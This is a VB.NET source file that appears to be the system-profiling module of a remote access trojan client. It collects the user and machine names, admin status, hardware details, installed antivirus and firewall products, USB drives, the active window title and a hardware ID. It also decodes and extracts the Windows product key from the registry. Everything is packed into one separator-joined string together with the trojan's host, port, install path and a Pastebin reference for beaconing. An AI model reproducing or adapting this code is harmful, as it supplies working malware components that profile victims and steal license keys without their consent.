
Imports System.Management
Imports System.Windows.Forms

Public Class ID
    Private Shared SPL = Main.SPL

    Public Shared Function UserName()
        Try
            Return Environment.UserName
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function MyOS()
        Try
            Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function Bit()
        Try
            If Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Contains("64") Then
                Return "x64"
            Else
                Return "x86"
            End If
        Catch ex As Exception
            Return "*"
        End Try
    End Function

    Public Shared Function AmiAdmin()
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return "Running as administrator"
            Else
                Return "Running as user"
            End If
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function INDATE() As String
        Try
            Dim file As New IO.FileInfo(Windows.Forms.Application.ExecutablePath)
            Return CType(file, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function ListDrivers()
        Try
            Dim sb As Text.StringBuilder = New Text.StringBuilder()
            For Each drive In Environment.GetLogicalDrives
                Dim Driver As IO.DriveInfo = New IO.DriveInfo(drive)
                If Driver.DriveType = IO.DriveType.Fixed Then
                    sb.Append(drive.ToString + "  ")
                End If
            Next
            Return sb.ToString
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function ListUSB()
        Try
            Dim sb As Text.StringBuilder = New Text.StringBuilder()
            For Each drive In Environment.GetLogicalDrives
                Dim Driver As IO.DriveInfo = New IO.DriveInfo(drive)
                If Driver.DriveType = IO.DriveType.Removable Then
                    sb.Append(drive.ToString + "  ")
                End If
            Next
            Return sb.ToString
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function GPU()
        Try
            Dim VideoCard As String = String.Empty
            Dim objquery As New Management.ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New Management.ManagementObjectSearcher(objquery)

            For Each MemObj As Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & " "
            Next
            Return VideoCard
        Catch
            Return "Error"
        End Try
    End Function

    Public Shared Function CPU() As String
        Try
            Dim P As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
            P.Get()
            ' If P("Name").ToString.Contains("Intel") Then
            Return P("Name").ToString.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "")
            ' End If
            Return P("Name").ToString
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function MachineType()
        Try
            Dim ps As Windows.Forms.PowerStatus = Windows.Forms.SystemInformation.PowerStatus
            Dim batteryStatus As String = ps.BatteryChargeStatus.ToString
            If batteryStatus = "NoSystemBattery" Then
                Return "Desktop"
            Else
                Return "Laptop"
            End If
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Shared Function LastReboot() As String
        Try
            Dim str As String = Nothing
            Dim since As Double = New Devices.Computer().Clock.TickCount / 1000 / 60
            If since > 60 Then
                since = since / 60
                If since > 24 Then
                    since = since / 24
                    str = (CInt(since)).ToString() & " day(s) ago"
                Else
                    str = (CInt(since)).ToString() & " hour(s) ago"
                End If
            Else
                str = (CInt(since)).ToString() & " minute(s) ago"
            End If
            Return str
        Catch ex As Exception
            Return "Error"
        End Try

    End Function

    Public Shared Function AV() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str = str.ToString
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function

    Public Shared Function FW() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str = str.ToString
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function

    Public Shared Function WinKey() As String

        Try
            Dim HexBuf As Object = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\", "DigitalProductId", 0)

            If HexBuf Is Nothing Then Return "N/A"
            Dim tmp As String = ""

            For l As Integer = LBound(HexBuf) To UBound(HexBuf)
                tmp = tmp & " " & Hex(HexBuf(l))
            Next

            Dim StartOffset As Integer = 52
            Dim EndOffset As Integer = 67
            Dim Digits(24) As String

            Digits(0) = "B" : Digits(1) = "C" : Digits(2) = "D" : Digits(3) = "F"
            Digits(4) = "G" : Digits(5) = "H" : Digits(6) = "J" : Digits(7) = "K"
            Digits(8) = "M" : Digits(9) = "P" : Digits(10) = "Q" : Digits(11) = "R"
            Digits(12) = "T" : Digits(13) = "V" : Digits(14) = "W" : Digits(15) = "X"
            Digits(16) = "Y" : Digits(17) = "2" : Digits(18) = "3" : Digits(19) = "4"
            Digits(20) = "6" : Digits(21) = "7" : Digits(22) = "8" : Digits(23) = "9"

            Dim dLen As Integer = 29
            Dim sLen As Integer = 15
            Dim HexDigitalPID(15) As String
            Dim Des(30) As String

            Dim tmp2 As String = ""

            For i = StartOffset To EndOffset
                HexDigitalPID(i - StartOffset) = HexBuf(i)
                tmp2 = tmp2 & " " & Hex(HexDigitalPID(i - StartOffset))
            Next

            Dim KEYSTRING As String = ""

            For i As Integer = dLen - 1 To 0 Step -1
                If ((i + 1) Mod 6) = 0 Then
                    Des(i) = "-"
                    KEYSTRING = KEYSTRING & "-"
                Else
                    Dim HN As Integer = 0
                    For N As Integer = (sLen - 1) To 0 Step -1
                        Dim Value As Integer = ((HN * 2 ^ 8) Or HexDigitalPID(N))
                        HexDigitalPID(N) = Value \ 24
                        HN = (Value Mod 24)

                    Next

                    Des(i) = Digits(HN)
                    KEYSTRING = KEYSTRING & Digits(HN)
                End If
            Next

            Return StrReverse(KEYSTRING)
        Catch ex As Exception
            Return "Error"
        End Try

    End Function

    Public Shared Function DotNET()
        Try
            Dim v As New Text.StringBuilder
            For Each Folder In IO.Directory.GetDirectories((IO.Path.GetPathRoot(Environment.GetLogicalDrives(Environment.SpecialFolder.Desktop)) + "Windows\Microsoft.NET\Framework\"))
                v.Append(IO.Path.GetFileName(Folder).Substring(0, 4) + "  ")
            Next
            Return v.ToString
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer

    Public Shared Function ActiveWindow() As String
        Try
            Dim G As IntPtr = GetForegroundWindow()
            If G = IntPtr.Zero Then
                Return ""
            End If
            Dim W As Integer
            W = GetWindowTextLength(G)
            Dim STR As String = StrDup(W + 1, "*")
            GetWindowText(G, STR, W + 1)
            Dim PID As Integer
            GetWindowThreadProcessId(G, PID)
            If PID = 0 Then
                Return STR
            Else
                Try
                    Return Process.GetProcessById(PID).MainWindowTitle()
                Catch ex As Exception
                    Return STR
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Public Shared Function Getsystem() As String
        Try
            Return SystemInformation.ComputerName.ToString() & SPL &
            SystemInformation.UserName.ToString() & SPL &
            AmiAdmin() & SPL &
            My.Computer.Info.OSFullName & SPL &
            My.Computer.Info.OSVersion & SPL &
            Bit() & SPL &
            WinKey() & SPL &
            CPU() & SPL &
            GPU() & SPL &
            FormatNumber(My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024, 2) & " GB " & SPL &
            My.Computer.Screen.Bounds.Size.ToString & SPL &
            Main.HOST & SPL &
            Main.PORT & SPL &
            Main.FULLPATH & SPL &
            LastReboot() & SPL &
            AV() & SPL &
            MachineType() & SPL &
            DotNET() & SPL &
            ListDrivers() & SPL &
            Main.HWID & SPL &
            ActiveWindow() & SPL &
            FW() & SPL &
            ListUSB() & SPL &
            Main.Pastebin
        Catch
            Return "N/A"
        End Try
    End Function


End Class